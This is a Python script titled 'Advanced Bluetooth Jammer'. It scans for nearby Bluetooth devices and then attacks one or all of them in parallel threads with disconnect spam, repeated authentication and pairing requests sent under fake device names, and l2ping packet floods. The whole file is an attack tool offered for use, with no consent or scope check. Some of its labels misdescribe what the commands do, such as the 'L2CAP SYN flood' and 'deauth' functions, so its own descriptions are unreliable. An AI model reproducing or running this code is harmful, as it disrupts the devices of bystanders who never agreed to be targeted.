import os
import subprocess
import time
import threading
from termcolor import colored

def unblock_adapter():
    print(colored("[*] Unblocking and enabling the Bluetooth adapter...", 'cyan'))
    try:
        subprocess.run(["rfkill", "unblock", "all"], check=True)
        subprocess.run(["hciconfig", "hci0", "up"], check=True)
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error unblocking or enabling adapter: {e}", 'red'))

def select_adapter():
    adapters = os.listdir('/sys/class/bluetooth/')
    if not adapters:
        print(colored("[!] No Bluetooth adapters found! Make sure your Bluetooth is enabled.", 'red'))
        exit(1)
    
    print(colored("[*] Available Bluetooth Adapters:", 'cyan'))
    for i, adapter in enumerate(adapters):
        print(f"{i + 1}. {adapter}")
    choice = int(input(colored("Select adapter number: ", 'yellow')))
    
    selected_adapter = adapters[choice - 1]
    print(colored(f"[*] Using adapter: {selected_adapter}", 'green'))
    return selected_adapter

def fast_scan_devices(adapter):
    devices = []
    try:
        print(colored("[*] Fast scanning with hcitool...", 'cyan'))
        hcitool_output = subprocess.run(["hcitool", "-i", adapter, "scan"], capture_output=True, text=True, check=True)
        output_lines = hcitool_output.stdout.splitlines()[1:]  # Skip the header

        for line in output_lines:
            parts = line.split()
            if len(parts) >= 2:
                addr = parts[0]
                name = " ".join(parts[1:])
                devices.append((addr, name))
                print(colored(f"[*] Device found: {name} ({addr})", 'green'))

        # Faster scan using bluetoothctl
        print(colored("[*] Using bluetoothctl for a faster scan...", 'cyan'))
        
        try:
            subprocess.run(["bluetoothctl", "scan", "on"], check=True)
            time.sleep(4)  # Reduced wait time for faster discovery

            scan_output = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True, check=True)
            for line in scan_output.stdout.splitlines():
                if "Device" in line:
                    parts = line.split(" ")
                    addr = parts[1]
                    name = " ".join(parts[2:])
                    if (addr, name) not in devices:
                        devices.append((addr, name))
                        print(colored(f"[*] Additional device found: {name} ({addr})", 'green'))
        except subprocess.CalledProcessError:
            print(colored("[!] Warning: Unable to use bluetoothctl for scanning.", 'yellow'))
        
        # Stop scanning immediately after collection
        try:
            subprocess.run(["bluetoothctl", "scan", "off"], check=True)
        except subprocess.CalledProcessError:
            print(colored("[!] Warning: Unable to stop scanning with bluetoothctl.", 'yellow'))

    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error during scan: {e}", 'red'))

    return devices

def disconnect_device(target_address, adapter):
    print(colored(f"[*] Sending disconnect command to {target_address}", 'red'))
    for _ in range(50):  # Repeatedly try to disconnect
        try:
            subprocess.run(["hcitool", "-i", adapter, "dc", target_address], capture_output=True, text=True, check=False)  # Disconnect command
            print(colored(f"[*] Disconnection attempt on {target_address}", 'green'))
        except subprocess.CalledProcessError:
            pass
        time.sleep(0.05)  # Minimal delay for aggressive disconnection attempts

def deauth_attack(target_address, adapter):
    print(colored(f"[*] Starting Deauthentication attack on {target_address}", 'red'))
    for _ in range(100):  # Aggressive deauthentication
        try:
            subprocess.run(["hcitool", "-i", adapter, "auth", target_address], capture_output=True, text=True, check=False)  # Deauth command
            print(colored(f"[*] Deauthentication request sent to {target_address}", 'green'))
        except subprocess.CalledProcessError:
            pass
        time.sleep(0.1)  # Aggressive spam with minimal delay

def spoof_pairing(target_address, adapter):
    fake_devices = ["Smart TV", "MacBook Pro", "PS5", "Samsung Galaxy", "iPhone 15"]
    
    for fake_name in fake_devices:
        print(colored(f"[*] Sending spoofed pairing request from {fake_name} to {target_address}", 'yellow'))
        for _ in range(100):  # Send 100 pairing requests for each fake device
            try:
                subprocess.run(["hcitool", "-i", adapter, "cc", target_address], capture_output=True, text=True, check=False)  # Create connection
                subprocess.run(["hcitool", "-i", adapter, "auth", target_address], capture_output=True, text=True, check=False)  # Simulate pairing request
                print(colored(f"[*] Pairing request sent from {fake_name} to {target_address}", 'green'))
            except subprocess.CalledProcessError:
                # Suppress errors and continue
                pass
            time.sleep(0.05)  # Aggressive spam with minimal delay

def packet_flood(target_address, adapter):
    print(colored(f"[*] Flooding {target_address} with invalid packets", 'red'))
    for _ in range(100):  # Increased the number of packets
        try:
            subprocess.run(["l2ping", "-i", adapter, "-s", "1024", "-f", target_address], capture_output=True, text=True, check=False)  # Large packet size
            print(colored(f"[*] Packet flood initiated against {target_address}", 'green'))
        except subprocess.CalledProcessError:
            pass
        time.sleep(0.1)  # Reduced delay between packets for faster flooding

def l2cap_flood(target_address, adapter):
    print(colored(f"[*] Starting L2CAP SYN flood attack on {target_address}", 'red'))
    for _ in range(100):  # Increased the number of packets
        try:
            subprocess.run(["l2ping", "-i", adapter, "-s", "2048", "-f", target_address], capture_output=True, text=True, check=False)  # Larger packet size
            print(colored(f"[*] L2CAP SYN flood initiated against {target_address}", 'green'))
        except subprocess.CalledProcessError:
            pass
        time.sleep(0.1)  # Reduced delay between packets for faster flooding

def attack_device(target_address, adapter):
    print(colored(f"[*] Attacking device: {target_address} with all methods...", 'red'))

    # Perform all attacks in parallel using threads
    try:
        # Send pairing requests
        pairing_thread = threading.Thread(target=spoof_pairing, args=(target_address, adapter))
        # Packet flood
        flood_thread = threading.Thread(target=packet_flood, args=(target_address, adapter))
        # L2CAP SYN flood
        l2cap_thread = threading.Thread(target=l2cap_flood, args=(target_address, adapter))
        # Disconnect requests
        disconnect_thread = threading.Thread(target=disconnect_device, args=(target_address, adapter))
        # Deauth attack
        deauth_thread = threading.Thread(target=deauth_attack, args=(target_address, adapter))

        # Start all attacks
        pairing_thread.start()
        flood_thread.start()
        l2cap_thread.start()
        disconnect_thread.start()
        deauth_thread.start()

        # Wait for threads to complete
        pairing_thread.join()
        flood_thread.join()
        l2cap_thread.join()
        disconnect_thread.join()
        deauth_thread.join()
        
    except KeyboardInterrupt:
        print(colored("\n[!] Stopping attack... Exiting!", 'red'))

def attack_all_devices(devices, adapter):
    threads = []
    for addr, name in devices:
        print(colored(f"[*] Targeting device: {name} ({addr})", 'red'))
        attack_thread = threading.Thread(target=attack_device, args=(addr, adapter))
        threads.append(attack_thread)
        attack_thread.start()

    # Join all threads to ensure all attacks happen concurrently
    for thread in threads:
        thread.join()

def main():
    print(colored("###############################################", 'green'))
    print(colored("#                  LMORRIO                    #", 'green', attrs=['bold']))
    print(colored("#          Advanced Bluetooth Jammer          #", 'green'))
    print(colored("###############################################", 'green'))
    
    unblock_adapter()  # Ensure adapter is unblocked

    adapter = select_adapter()  # Allow user to select Bluetooth adapter

    print(colored("[*] Starting aggressive attack mode...", 'cyan'))
    
    try:
        while True:
            devices = fast_scan_devices(adapter)
            
            if devices:
                print(colored("[*] Devices found. What would you like to do?", 'cyan'))
                print(colored("1. Attack all devices", 'cyan'))
                print(colored("2. Attack a specific device", 'cyan'))
                print(colored("3. Rescan", 'cyan'))
                choice = input(colored("Enter your choice: ", 'yellow'))
                
                if choice == '1':
                    print(colored("[*] Attacking all devices...", 'red'))
                    attack_all_devices(devices, adapter)
                elif choice == '2':
                    print(colored("[*] Please select the device number to attack:", 'yellow'))
                    for i, (addr, name) in enumerate(devices):
                        print(f"{i + 1}. {name} ({addr})")
                    selected_index = int(input(colored("Select device number: ", 'yellow'))) - 1
                    if 0 <= selected_index < len(devices):
                        addr, name = devices[selected_index]
                        print(colored(f"[*] Selected device: {name} ({addr})", 'green'))
                        attack_device(addr, adapter)
                    else:
                        print(colored("[!] Invalid selection!", 'red'))
                elif choice == '3':
                    print(colored("[*] Rescanning devices...", 'cyan'))
                else:
                    print(colored("[!] Invalid choice. Please select 1, 2, or 3.", 'red'))
            else:
                print(colored("[!] No devices found. Scanning again...", 'red'))
                time.sleep(5)  # Wait before rescanning

    except KeyboardInterrupt:
        print(colored("\n[!] Stopping Bluetooth Jammer... Exiting!", 'red'))
        exit(0)  # Graceful exit on Ctrl+C

if __name__ == "__main__":
    main()
